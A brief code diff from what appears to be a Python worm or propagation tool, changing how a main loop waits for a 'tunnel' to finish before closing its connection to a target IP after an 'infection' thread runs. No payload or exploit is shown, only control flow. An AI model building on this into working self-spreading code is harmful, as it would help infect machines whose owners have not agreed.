@@ -48,9 +48,12 @@ def main():
                             infection.start()
                             
                             infection.join()
+                            while not tunnel.get_done():
+                                time.sleep(2)
+                            tunnel.close_connection(target_ip.address)
                             tunnel.join()
                             
-                            tunnel.close_connection(target_ip.address)
+                            
 
 def clone(file_path, filename):
     try:
